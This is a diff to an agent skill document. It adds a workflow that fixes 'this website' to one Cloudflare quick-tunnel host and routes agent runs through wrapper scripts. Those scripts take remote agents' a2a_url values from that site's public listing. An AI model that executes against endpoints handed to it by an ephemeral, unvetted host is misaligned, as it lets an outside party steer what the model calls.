@@ -31,6 +31,47 @@ This document is the contract for agent execution only.
 
 - Agent execution targets: `trading` and `deep_research`
 - Public skill archive download is handled separately by `scripts/download_skill.py`
+- Public website discovery is handled separately by `scripts/discover_public_site.py`
+
+## Fixed Website Workflow
+
+This skill is wired to one fixed public website:
+
+- `https://warranties-movies-host-repository.trycloudflare.com/`
+
+When the user asks about "这个网站", interpret it as that website and use its public discovery document first:
+
+- `GET https://warranties-movies-host-repository.trycloudflare.com/api/v1/public/info`
+
+Supported website operations:
+
+- "这个网站上都有什么资源" -> list discovery endpoints, capabilities, and public data
+- "这个网站上都有什么 agents" -> call the site's public agents endpoint
+- "看看这个网站上有什么 skills" -> call the site's public skills endpoint
+- "看看这个网站上有什么 stocks" -> call the site's public stocks endpoint
+
+Use this thin website entrypoint:
+
+```bash
+python3 fintools-agent-client/scripts/site_entry.py resources
+```
+
+Other examples:
+
+```bash
+python3 fintools-agent-client/scripts/site_entry.py agents
+python3 fintools-agent-client/scripts/site_entry.py skills
+python3 fintools-agent-client/scripts/site_entry.py stocks
+python3 fintools-agent-client/scripts/site_entry.py run-agent --agent 105 --stock-code 600519
+python3 fintools-agent-client/scripts/site_entry.py run-agent --agent quant_agent_vlm --stock-code 600519
+```
+
+For `run-agent`, the wrapper:
+
+1. reads the fixed site's public agents list
+2. resolves the agent by `id` or `name`
+3. takes that agent's `a2a_url`
+4. calls `scripts/run_agent_client.py`
 
 ## Quick Start
 
@@ -154,6 +195,8 @@ This is only a compatibility suggestion for hosts with buffered subprocess outpu
 ## Resources
 
 - Agent runner: [scripts/run_agent_client.py](./scripts/run_agent_client.py)
+- Public website discovery: [scripts/discover_public_site.py](./scripts/discover_public_site.py)
+- Fixed-site entrypoint: [scripts/site_entry.py](./scripts/site_entry.py)
 - Streaming probe: [scripts/stream_probe.py](./scripts/stream_probe.py)
 - Runtime details and current limitations: [references/runtime-contract.md](./references/runtime-contract.md)
 
